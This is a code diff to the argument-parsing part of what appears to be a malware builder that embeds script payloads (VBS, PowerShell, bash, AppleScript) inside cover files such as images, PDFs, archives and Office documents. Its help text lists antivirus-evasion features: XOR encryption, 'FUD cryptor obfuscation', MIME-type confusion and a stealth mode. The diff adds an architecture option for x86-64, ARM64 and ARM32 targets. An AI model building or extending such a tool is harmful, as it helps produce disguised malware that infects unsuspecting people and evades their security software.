@@ -109,6 +109,8 @@ def run_build(args):
         print("  --type <jpeg|png|gif|pdf|zip|mp4|xlsx|docx>  Container type")
         print("  --payload-type <vbs|ps1|bash|sh|python|applescript|xlsx|docx>  Payload wrapper")
         print("  --target-os <windows|linux|macos|all>        Target platform (default: windows)")
+        print("  --arch <x86-64|arm64|arm32>               Architecture (default: x86-64)")
+        print("                                              arm32: Linux only. arm64: Win/Linux/macOS")
         print("  --encrypt                                     XOR encrypt payload")
         print("  --fud                                         FUD cryptor obfuscation")
         print("  --mime                                        MIME-type confusion")
@@ -122,6 +124,7 @@ def run_build(args):
     output = None
     payload_type = None
     target_os = "windows"
+    arch = "x86-64"
 
     i = 2
     while i < len(args):
@@ -131,6 +134,8 @@ def run_build(args):
             payload_type = args[i + 1]; i += 2
         elif args[i] == "--target-os" and i + 1 < len(args):
             target_os = args[i + 1].lower(); i += 2
+        elif args[i] == "--arch" and i + 1 < len(args):
+            arch = args[i + 1].lower(); i += 2
         elif args[i] == "--encrypt":
             encrypt = True; i += 1
         elif args[i] == "--fud":
@@ -154,6 +159,15 @@ def run_build(args):
         print(f"Payload file not found: {payload_path}")
         sys.exit(1)
 
+    # Validate arch
+    valid_archs = ('x86-64', 'arm64', 'arm32')
+    if arch not in valid_archs:
+        print(f"Invalid arch: {arch}. Valid: {', '.join(valid_archs)}")
+        sys.exit(1)
+    if arch == 'arm32' and target_os != 'linux':
+        print("ARM32 only supported on Linux")
+        sys.exit(1)
+
     builder = PolyglotBuilder()
     try:
         # If target_os is "all", build for each platform
@@ -173,7 +187,7 @@ def run_build(args):
                                           fud=fud, mime_confuse=mime,
                                           payload_type=payload_type,
                                           target_os=plat_info['os'],
-                                          stealth=stealth)
+                                          arch=arch, stealth=stealth)
                     print(f"\n  [{plat_name.upper()}] Output: {plat_output}")
                     print(f"    Payload Type: {stats.get('payload_type', 'N/A')}")
                     print(f"    Total:        {stats['output_size']:,} bytes")
@@ -186,10 +200,11 @@ def run_build(args):
         stats = builder.build(cover_path, payload_path, output,
                               container_type=container, encrypt=encrypt,
                               fud=fud, mime_confuse=mime, payload_type=payload_type,
-                              target_os=target_os, stealth=stealth)
+                              target_os=target_os, arch=arch, stealth=stealth)
         print(f"\n  Output:       {stats['output']}")
         print(f"  Container:    {stats['container_type']}")
         print(f"  Target OS:    {target_os}")
+        print(f"  Architecture: {arch}")
         if stats.get('payload_type'):
             print(f"  Payload Type: {stats['payload_type']}")
         print(f"  Cover:        {stats['cover_size']:,} bytes")
